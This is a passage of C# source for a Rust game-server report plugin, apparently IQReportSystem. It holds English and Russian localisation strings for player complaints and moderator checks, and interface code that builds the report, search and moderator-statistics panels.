                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_TITLE"] = "<size=30><b>COMPLAINT INFORMATION</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_DESC"] = "<size=8>CHOOSE THE REASON FOR THE PLAYER COMPLAINT</size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_TITLE"] = "<size=25><b>PLAYER</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_CLOSE"] = "<size=18><b>CLOSE</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_LIST"] = "<size=20><b>CHOOSE THE REASON FROM THE LIST</b></size>",


                ["UI_NEW_MODERATION_MODER_GO_CHECK_TITLE"] = "<size=30><b>PLAYER INFORMATION</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_DESC"] = "<size=8>CHOOSE ACTION WHICH YOU WANT TO PERFORM</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_TITLE"] = "<size=25><b>DETAILED INFORMATION</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_REPORT"] = "<size=18>HISTORY OF COMPLAINTS</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_RCC"] = "<size=18>INFO RCC</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_REPORTS"] = "<size=25><b>REPORTS</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_LAST_CHECK"] = "<size=14>LAST CHECKER: {0}</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_COUNT_CHECK"] = "<size=14>CHECK COUNTS: {0}</size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_GOCHECK"] = "<size=18>START</size>",

                ["UI_NEW_ALERT_PLAYER_WARNING"] = "<size=40><b>YOU CALLED TO THE TEST</b></size>",
                ["UI_NEW_ALERT_PLAYER_TITLE"] = "<size=18>You exceeded the maximum allowable number of complaints.\npoetomu,provide your ex, in order to be contacted by our moderation!\nPV case of ignoring this message, you will get a lock! (You have 5 minutes)</size>",
                ["UI_NEW_ALERT_PLAYER_DESC"] = "<size=15>to provide data for communication,use the commands:\n/discord\npdale you will be contacted by the moderator</size>",

                ["UI_NEW_MINI_PANEL_MODERATOR_TITLE"] = "<size=14><b>MENU MODERATOR</b></size>",
                ["UI_NEW_MINI_PANEL_MODERATOR_BAN"] = "<size=18><b>BAN</b></size>",
                ["UI_NEW_MINI_PANEL_MODERATOR_STOP"] = "<size=18><b>STOP</b></size>",

                ["UI_NEW_RAITING_PANEL"] = "<size=13><b>GIVE RAITING</b>></size>",

            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["PLAYER_CHECKED"] = "Данного игрока уже проверяют!",

                ["MSG_REPORTED_SUSPECT"] = "Вы успешно отправили жалобу на игрока - {0}\nЖалоба : {1}\nМодератор рассмотрит вашу жалобу как можно скорее!",
                ["MSG_CHECK_DISCORD"] = "Вы не можете отправить Discord без проверки!",
                ["MSG_CHECK_CHECK_STOP"] = "Вы успешно прошли проверку!\nЖелаем приятной игры на нашем сервере!",
                ["MSG_COOLDOWN"] = "Вы недавно отправляли жалобу!\nПодождите еще <color=#47AF5DFF>{0}</color>",
                ["MSG_DISCORD_SEND"] = "Вы успешно предоставили данные!\nDiscord - {0}\nОжидайте звонка от модератора",

                ["UI_MODERATOR_PANEL_TITLE"] = "Меню модератора сервера",
                ["UI_MODERATOR_PANEL_DESCRIPTION"] = "В данном списке отображены игроки - достигшие предела жалоб,нажмите по игроку чтобы получить больше информации",
                ["UI_MODERATOR_PANEL_START_CHECK"] = "Вызвать на проверку",
                ["UI_STATUS"] = "Статус",

                ["NETWORD_STATUS_ONLINE"] = "Онлайн",
                ["IS_STEAM_STATUS_PIRATE"] = "Пират",
                ["IS_STEAM_STATUS_LICENSE"] = "Лицензия", 

                ["METODS_SEND_REPORT_VK"] = "[IQReportSystem]\nНа игрока {0}({1}) отправили жалобу!\nЖалоба - {2}\nОтправил жалобу : {3}({4})",
                ["METODS_HELP_MODERS"] = "Игрок <color=#47AF5DFF>{0}</color> достиг предельного количества репортов!\nКоличество его репортов - <color=#47AF5DFF>{1}</color>\nМодерация которая свободна - проверьте игрока!",
                ["METODS_HELP_MODERS_VK"] = "[IQReportSystem]\nИгрок {0} достиг предельного количества репортов!\nКоличество его репортов - {1}\nМодерация которая свободна - проверьте игрока!",
                ["METODS_MODER_START_CHECK"] = "Вы начали проверку!\nПодозреваемый - <color=#47AF5DFF>{0}</color>\nНачинаем проверку на AFK!\nЕсли игрок не AFK - ему выведут уведомление о проверке!",
                ["METODS_MODER_START_CHECK_VK"] = "[IQReportSystem]\nМодератор {0}({1}) начал проверку!\nПодозреваемый - {2}({3})",
                ["METODS_MODER_STOP_CHECK"] = "Проверка завершена.\nУдачного дня!\nНе забывай проверять список жалоб!",
                ["METODS_MODER_STOP_CHECK_VK"] = "[IQReportSystem]\nМодератор {0} закончил проверку!",
                ["METODS_MODER_STOP_CHECK_ALERT"] = "Модератор {0} закончил проверку игрока - {1}\nЗапрещенного не обнаружено",
                ["NON_REPORT"] = "Жалоб нет",
                ["MODERATOR_RETURN_WELCOME"] = "С возвращением!\nПроверка не была отменена,продолжайте!",
                ["STATUS_CHANGED"] = "У игрока {0} изменился статус на : {1}\nОжидайте игрока на сервере в течении 10 минут!\nЕсли игрок не зайдет после 10 минут - выдавайте бан за Отказ",
                ["STATUS_CHANGED_VK"] = "[IQReportSystem]У игрока {0} изменился статус на : {1}\nОжидайте игрока на сервере в течении 10 минут!\nЕсли игрок не зайдет после 10 минут - выдавайте бан за Отказ",
                ["MODERATOR_DISCONNECTED_STOP_CHECK"] = "Проверка была снята!\nМодератор {0} покинул сервер\n Причина : Разрыв соединения\nПриносим свои извинения!\nМы сообщим другой модерации!",
                ["MODERATOR_DISCONNECTED_STOP_RESEND"] = "Модератор {0} окончательно покинул сервер во время проверки!\nИгрок {1} ожидает других модераторов для проверки!",
                ["MODERATOR_COMPLETED_CHECK"] = "Вы успешно завершили проверку и вынесли свой вердикт\nВаш вердикт : {0}",
                ["MODERATOR_COMPLETED_CHECK_ALERT"] = "Модератор {0} закончил проверку игрока {1}\nВердикт: {2}",
                ["MODERATOR_COMPLETED_CHECK_VK"] = "[IQReportSystem]\nМодератор {0}[(1)] закончил проверку\n Подозреваемый {2}[{3}]\nВердикт : {4}\n[Проверка на AFK]Игрок не двигался : {5}/5",
                ["PLAYER_AFK_CHECK_STOP"] = "Игрок AFK\nПроверка снята автоматически!",
                ["PLAYER_AFK_CHECK_STOP_VK"] = "[IQReportSystem]\nМодератор {0}({1}) проверял игрока {2}.\nИгрок AFK и проверка была снята!",
                ["PLAYER_AFK_CHANGE_POS"] = "Игрок двигался! Проверка {0}/5",
                ["PLAYER_AFK_CHANGE_NO_POS"] = "Игрок не двигался! Проверка {0}/5",
                ["PLAYER_NON_AFK"] = "Игрок двигается.\nПроверяйте дальше!",
                ["DISCORD_NULL"] = "Не предоставлен",
                ["REPORT_LIST_CONSOLE"] = "\n[IQReportSystem]:\nСписок игроков в Панели-Модерации",
                ["DISCROD_VK_SEND"] = "[IQReportSystem]\nИгрок {0}({1}) предоставил Discord на проверку!\nDiscord - {2}",
                ["CONSOLE_REPORT_GIVE"] = "Игроку {0} успешно добавлены репорты в количестве - {1}. Его количество составляет - {2}",
                ["CONSOLE_REPORT_REMOVE"] = "Игроку {0} успешно сняты репорты в количестве - {1} Его количество составляет - {2}",
                ["MODERATOR_NON_OPEN_MENU"] = "Вы не можете открыть меню модератора при проверке игрока!\nОкончите проверку!",
                ["UI_RAITING_MODERATION_VK_GIVE"] = "[IQReportSystem]:\nИгрок {0}({1}) оценил работу модератора {2}({3}) на {4} звезды",
                ["UI_RAITING_MODERATION_VK_GIVE_THX"] = "Спасибо за ваш отзыв!",
                ["UI_RAIT_ALERT_MODER"] = "Вашу работу оценили в {0} звезд(ы). Вы получаете {1} репутации",


                ["UI_NEW_CHECKED_COUNT"] = "<size=14>ПРОВЕРЕН: {0}</size>",
                ["UI_NEW_CLOSE"] = "<size=24><b>ЗАКРЫТЬ</b></size>",

                ["UI_NEW_MODERATION_TITLE_PANEL"] = "<size=18>ПАНЕЛЬ ПРОВЕРЯЮЩЕГО</size>",
                ["UI_NEW_MODERATION_REPORT_BTN"] = "<size=20><b>ЖАЛОБЫ</b></size>",

                ["UI_NEW_MODERATION_TITLE_STATS"] = "<size=18><b>СТАТИСТИКА ПРОВЕРЯЮЩЕГО</b></size>",
                ["UI_NEW_MODERATION_STATS_COUNTCHECK"] = "<size=8>КОЛИЧЕСТВО ПРОВЕРОК: {0}</size>",
                ["UI_NEW_MODERATION_STATS_COUNTBANS"] = "<size=8>БЛОКИРОВОК ВЫДАНО: {0}</size>",
                ["UI_NEW_MODERATION_STATS_STARS"] = "<size=15><b>ОЦЕНКА КАЧЕСТВА : {0}</b></size>",

                ["UI_NEW_MODERATION_REPORT_PANEL_TITLE"] = "<size=70><b>ЖАЛОБЫ</b></size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION"] = "<size=8>ВЫБЕРИТЕ ИГРОКА ЧТОБЫ ОТПРАВИТЬ НА НЕГО ЖАЛОБУ</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION_MODERATOR"] = "<size=8>ВЫБЕРИТЕ ИГРОКА В ПАНЕЛИ ЧТОБЫ НАЧАТЬ ПРОВЕРКУ</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_SEARCH_DESCRIPTION"] = "<size=14>ВВЕДИТЕ НИК ИЛИ STEAM64ID ДЛЯ ПОИСКА ИГРОКА</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_SEARCH_TITLE"] = "<size=50><b>ПОИСК</b></size>",

                ["UI_NEW_MODERATION_REPORT_PANEL_PLAYER_REPORTEDS"] = "<size=14><b>ЖАЛОБЫ : {0}</b></size>",

                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_TITLE"] = "<size=30><b>ИНФОРМАЦИЯ О ЖАЛОБЕ</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_DESC"] = "<size=8>ВЫБЕРИТЕ ПРИЧИНУ ДЛЯ ЖАЛОБЫ НА ИГРОКА</size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_TITLE"] = "<size=25><b>ИГРОК</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_CLOSE"] = "<size=18><b>ЗАКРЫТЬ</b></size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_LIST"] = "<size=20><b>ВЫБЕРИТЕ ПРИЧИНУ ИЗ СПИСКА</b></size>",

                ["UI_NEW_MODERATION_MODER_GO_CHECK_TITLE"] = "<size=30><b>ИНФОРМАЦИЯ О ИГРОКЕ</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_DESC"] = "<size=8>ВЫБЕРИТЕ ДЕЙСТВИЯ КОТОРОЕ ХОТИТЕ СОВЕРШИТЬ</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_TITLE"] = "<size=25><b>ПОДРОБНАЯ ИНФОРМАЦИЯ</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_REPORT"] = "<size=18>ИСТОРИЯ ЖАЛОБ</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_RCC"] = "<size=18>ИНФОРМАЦИЯ RCC</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_REPORTS"] = "<size=25><b>ЖАЛОБ</b></size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_LAST_CHECK"] = "<size=14>ПОСЛЕДНИЙ ПРОВЕРЯЮЩИЙ : {0}</size>",
                ["UI_NEW_MODERATION_MODER_GO_CHECK_MORE_COUNT_CHECK"] = "<size=14>КОЛИЧЕСТВО ПРОВЕРОК: {0}</size>",
                ["UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_GOCHECK"] = "<size=18>ПРОВЕРИТЬ</size>",

                ["UI_NEW_ALERT_PLAYER_WARNING"] = "<size=40><b>ВАС ВЫЗВАЛИ НА ПРОВЕРКУ</b></size>",
                ["UI_NEW_ALERT_PLAYER_TITLE"] = "<size=18>Вы превысили максимально-допустимое количество жалоб.\nПоэтому,предоставьте ваш Discord, для того чтобы с вами связалась наша модерация!\nВ случае игнорирования данного сообщения - вы получите блокировку! (У вас имеется 5 минут)</size>",
                ["UI_NEW_ALERT_PLAYER_DESC"] = "<size=15>Чтобы предоставить данные для связи,используйте команды:\n/discord\nДалее с вами свяжется модератор</size>",

                ["UI_NEW_MINI_PANEL_MODERATOR_TITLE"] = "<size=14><b>МЕНЮ ПРОВЕРЯЮЩЕГО</b></size>",
                ["UI_NEW_MINI_PANEL_MODERATOR_BAN"] = "<size=18><b>ВЕРДИКТ</b></size>",
                ["UI_NEW_MINI_PANEL_MODERATOR_STOP"] = "<size=18><b>СТОП</b></size>",


                ["UI_NEW_RAITING_PANEL"] = "<size=13><b>ОЦЕНИТЕ ПРОВЕРЯЮЩЕГО</b>></size>",
            }, this, "ru");
            PrintWarning("Языковой файл загружен успешно");
        }
        #endregion

        #region Interface

        public static string PARENT_UI =  "MAIN_PARENT_UI";
        public static string PARENT_UI_REPORT_MENU = "PARENT_UI_REPORT_MENU";
        public static string PARENT_UI_PLAYER_PANEL = "PARENT_UI_PLAYER_PANEL";
        public static string PARENT_UI_PLAYER_REPORT = "PARENT_UI_PLAYER_REPORT";
        public static string PARENT_UI_MODER_REPORT = "PARENT_UI_MODER_REPORT";
        public static string PARENT_UI_ALERT_SEND = "PARENT_UI_ALERT_SEND";
        public static string PARENT_UI_MODERATOR_MINI_PANEL = "PARENT_UI_MODERATOR_MINI_PANEL";
        private static string UI_MODERATION_CHECK_MENU_DISCORD = "UI_MODERATION_CHECK_MENU_DISCORD_PARENT";
        private static string UI_MODERATION_CHECK_MENU_NETWORK = "UI_MODERATION_CHECK_MENU_NETWORK_PARENT";
        private static string UI_MODERATION_RAITING = "UI_MODERATION_RAITING";


        #region UI Main Interface
        private void RenderReport(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            UI_Interface(BasePlayer.FindByID(userID), Container);
        }

        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";

        void UI_Interface(BasePlayer player, CuiElementContainer container)
        {
            CuiHelper.DestroyUi(player, PARENT_UI);
            var Interface = config.Setting.Interface;
            var InformationUser = ReportInformation[player.userID];

            container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-430 -230",
                            OffsetMax = "490 270"
                        },
                    }
            });

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-150 0", OffsetMax = "0 500" },
                Image = { FadeIn = 0.15f, Color = HexToRustFormat(Interface.HexRightMenu), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            }, MenuContent, PARENT_UI);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.006666541 0.7046295", AnchorMax = "1 0.7462999" },
                Text = { Text = $"<b><size=8>{player.displayName}</size></b>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.6851852", AnchorMax = "1 0.7166605" },
                Text = { Text = String.Format(lang.GetMessage("UI_NEW_CHECKED_COUNT", this, player.UserIDString), InformationUser.CheckCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI);

            string ImageAvatar = GetImage(player.UserIDString, 0);
            container.Add(new CuiElement
            {
                Parent = PARENT_UI,
                Name = $"AVATAR",
                Components =
                 {
                    new CuiRawImageComponent { Png = ImageAvatar,Color = HexToRustFormat("#FFFFFFFF") },
                    new CuiRectTransformComponent{ AnchorMin = "0.08076949 0.7518547", AnchorMax = $"0.9341028 0.9888917"},
                 }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.05555556" },
                Button = { Close = PARENT_UI, Color = "0 0 0 0" },
                Text = { Text = lang.GetMessage("UI_NEW_CLOSE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Align = TextAnchor.MiddleCenter }
            }, PARENT_UI);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.6851852", AnchorMax = "1 0.7166605" },
                Text = { Text = String.Format(lang.GetMessage("UI_NEW_CHECKED_COUNT", this, player.UserIDString), InformationUser.CheckCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI);

            if (permission.UserHasPermission(player.UserIDString, PermissionModeration))
            {
                if (!ModeratorInformation.ContainsKey(player.userID))
                    Metods_PlayerConnected(player);

                var InformationModerator = ModeratorInformation[player.userID];

                #region PANEL MODERATION MENU

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.4907467", AnchorMax = "1 0.5574059" },
                    Text = { Text = lang.GetMessage("UI_NEW_MODERATION_TITLE_PANEL", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, PARENT_UI);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.1533333 0.4212967", AnchorMax = "1 0.47963" },
                    Button = { Command = "iqreport moderation_menu", Color = HexToRustFormat(Interface.HexButtonRightMenu), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { Text = lang.GetMessage("UI_NEW_MODERATION_REPORT_BTN", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Align = TextAnchor.MiddleCenter }
                },  PARENT_UI, "BTN_REPORTS");

                container.Add(new CuiElement
                {
                    Parent = "BTN_REPORTS",
                    Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = Interface.SpriteReportModeration },
                        new CuiRectTransformComponent { AnchorMin = "0.02362165 0", AnchorMax = "0.2755902 1" }
                    }
                });

                #endregion

                #region STATS PANEL MODERATION MENU

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.2574087", AnchorMax = "1 0.3138935" },
                    Text = { Text = lang.GetMessage("UI_NEW_MODERATION_TITLE_STATS", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, PARENT_UI);

                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0.003333271 0.1240732", AnchorMax = "1 0.2500008" },
                    Image = { Color = HexToRustFormat(Interface.HexButtonRightMenu), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
                },  PARENT_UI, "STATS_MODERATION");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.6911764", AnchorMax = "1 1" },
                    Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_STATS_COUNTCHECK", this, player.UserIDString), InformationModerator.CheckCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                },  "STATS_MODERATION");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5441177", AnchorMax = "1 0.7499995" },
                    Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_STATS_COUNTBANS", this, player.UserIDString), InformationModerator.BanPlayerModerator.Count), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, "STATS_MODERATION");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.2573562" },
                    Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_STATS_STARS", this, player.UserIDString), GetAverageRaiting(player.userID)), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.LowerCenter }
                }, "STATS_MODERATION");

                for (int i = 0; i < 5; i++)
                {
                    string ColorStar = Math.Floor(GetAverageRaiting(player.userID)) == 0 ? "#D9BA6AA2" : Math.Floor(GetAverageRaiting(player.userID)) >= i+1 ? "#d9ba6a" : "#D9BA6AA2";
                    container.Add(new CuiElement
                    {
                        Parent = "STATS_MODERATION",
                        Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(ColorStar), Sprite = Interface.SpriteRaiting },
                        new CuiRectTransformComponent { AnchorMin = $"{0.07023425 + (i * 0.175)} 0.2058797", AnchorMax = $"{0.2307694 + (i * 0.175)} 0.5661694" }
                    }
                    });
                }

                #endregion
            }

            timer.In(0.3f, () =>
            {
                UI_PanelReportsPlayer(player);
            });
        }

        #endregion

        #region UI Panel Reports Interface

        void UI_PanelReportsPlayer(BasePlayer player,  bool Moderation = false)
        {
            var Interface = config.Setting.Interface;
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, PARENT_UI_REPORT_MENU);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "-770 0", OffsetMax = "0 500" },
                Image = { Color = HexToRustFormat(Interface.HexMainPanel), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            },  PARENT_UI, PARENT_UI_REPORT_MENU);

            container.Add(new CuiElement
            {
                Parent = PARENT_UI_REPORT_MENU,
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = Interface.SpriteReport },
                        new CuiRectTransformComponent { AnchorMin = "0.007901235 0.8648087", AnchorMax = "0.09876543 0.9833272" }
                    }
            });

            string SearchName = "";
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.3799841 0.8888888", AnchorMax = "0.7234258 0.925926" },
                Image = { Color = HexToRustFormat(Interface.HexSearchPanel), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            },  PARENT_UI_REPORT_MENU, PARENT_UI_REPORT_MENU + ".Input");

            container.Add(new CuiElement
            {
                Parent = PARENT_UI_REPORT_MENU + ".Input",
                Name = PARENT_UI_REPORT_MENU + ".Input.Current",
                Components =
                { 
                    new CuiInputFieldComponent { Text = SearchName, FontSize = 14,Command = $"iqreport search {Moderation} {0} {SearchName}", Align = TextAnchor.MiddleLeft, Color = HexToRustFormat(Interface.HexLabels), CharsLimit = 15},
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09925909 0.8462963", AnchorMax = "0.4113576 0.9805495" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_REPORT_PANEL_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, PARENT_UI_REPORT_MENU);

            string DescriptionReportTitle = Moderation ? "UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION_MODERATOR" : "UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION";
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.1 0.9546276", AnchorMax = "0.38 0.98" },
                Text = { Text = lang.GetMessage(DescriptionReportTitle, this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, PARENT_UI_REPORT_MENU);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.7315881 0.8675926", AnchorMax = "0.9332258 0.9527258" }, 
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_REPORT_PANEL_SEARCH_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, PARENT_UI_REPORT_MENU);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.3799841 0.9277778", AnchorMax = "0.7313576 0.95" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_REPORT_PANEL_SEARCH_DESCRIPTION", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, PARENT_UI_REPORT_MENU);

            CuiHelper.AddUi(player, container);
            UI_Player_Loaded(player, Moderation);
        }

        #endregion

        #region UI Player Loaded Interface

        void UI_Player_Loaded(BasePlayer player, bool Moderation = false, int Page = 0, string TargetName = "", bool debug = true)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, PARENT_UI_PLAYER_PANEL);
            var Interface = config.Setting.Interface;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.8296296" },
                Image = { Color = "0 0 0 0" }
            }, PARENT_UI_REPORT_MENU, PARENT_UI_PLAYER_PANEL);


            int x = 0, y = 0, i = 20 * Page;

            IEnumerable<FakePlayer> playerList = (IEnumerable<FakePlayer>)(Moderation ? PlayerBases.Where(z => (ReportInformation.ContainsKey(z.UserID) && ReportInformation[z.UserID].ReportCount >= config.Setting.MaxReport) && z.DisplayName.ToLower().Contains(TargetName.ToLower()) || z.UserID.ToString().Contains(TargetName)).Skip(Page * 20)
                                                            : PlayerBases.Where(z => z.DisplayName.Contains(TargetName.ToLower()) || z.UserID.ToString().Contains(TargetName.ToLower())).Skip(i));

            var ActiviteList = ((Moderation ? BasePlayer.activePlayerList.Where(z => (ReportInformation.ContainsKey(z.userID) && ReportInformation[z.userID].ReportCount >= config.Setting.MaxReport) && z.displayName.ToLower().Contains(TargetName.ToLower()) || z.userID.ToString().Contains(TargetName)).Skip(Page * 20)
                                                : BasePlayer.activePlayerList.Where(z => z.displayName.ToLower().Contains(TargetName.ToLower()) || z.userID.ToString().Contains(TargetName)).Skip(i)));

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.4866512 0.008887243", AnchorMax = "0.5140741 0.05357143" },
                Text = { Text = $"<size=10>{Page}</size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, PARENT_UI_PLAYER_PANEL);

            if (IQFakeActive && config.IQFakeActiveSettings.UseIQFakeActive)
            {
                if (Page + 1 < (int)Math.Ceiling(((double)playerList.Count()) / 20))
                {
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0.5222067 0.008887243", AnchorMax = "0.5496294 0.05357143" },
                        Button = { Command = $"iqreport page next {Moderation} {Page}", Color = HexToRustFormat(Interface.HexPlayerButton), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                        Text = { Text = "<b><size=8>></size></b>", Align = TextAnchor.MiddleCenter }
                    }, PARENT_UI_PLAYER_PANEL);
                }
            }
            else
            {
                if ((Page + 1) * 20 < BasePlayer.activePlayerList.Count())
                {
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0.5222067 0.008887243", AnchorMax = "0.5496294 0.05357143" },
                        Button = { Command = $"iqreport page next {Moderation} {Page}", Color = HexToRustFormat(Interface.HexPlayerButton), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                        Text = { Text = "<b><size=8>></size></b>", Align = TextAnchor.MiddleCenter }
                    }, PARENT_UI_PLAYER_PANEL);
                }
            }

            if (Page > 0)
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.4510956 0.008887243", AnchorMax = "0.4785185 0.05357143" },
                    Button = { Command = $"iqreport page back {Moderation} {Page}", Color = HexToRustFormat(Interface.HexPlayerButton), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                    Text = { Text = "<b><size=8><</size></b>", Align = TextAnchor.MiddleCenter }
                }, PARENT_UI_PLAYER_PANEL);
            }
           
            if (IQFakeActive && config.IQFakeActiveSettings.UseIQFakeActive)
                foreach (var Plist in playerList)
                {
                    ulong UserID = Plist.UserID;
                    string DisplayName = Plist.DisplayName;
                    if (Friends != null)
                        if (config.Setting.FriendNoReport)
                            if ((bool)Friends.Call("HasFriend", player.userID, UserID)) continue;

                    if (UserID == player.userID) continue;
                    if (!IsFake(UserID))
                        if (permission.UserHasPermission(UserID.ToString(), PermissionAdmin)) continue;

                    container.Add(new CuiPanel
                    {
                        RectTransform = { 
                            AnchorMin = $"{0.00246954 + (x * 0.2540)} {0.8671876 - (y * 0.2)}", 
                            AnchorMax = $"{0.2 + (x * 0.2540)} {0.9910715 - (y * 0.2)}" },
                        Image = { Color = HexToRustFormat(Interface.HexSearchPanel), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
                    }, PARENT_UI_PLAYER_PANEL, $"PLAYER_{i}");

                    string ImageAvatar = GetImage(UserID.ToString(), 0);
                    container.Add(new CuiElement
                    {
                        Parent = $"PLAYER_{i}",
                        Components =
                         {
                            new CuiRawImageComponent { Png = ImageAvatar,Color = HexToRustFormat("#FFFFFFAA") },
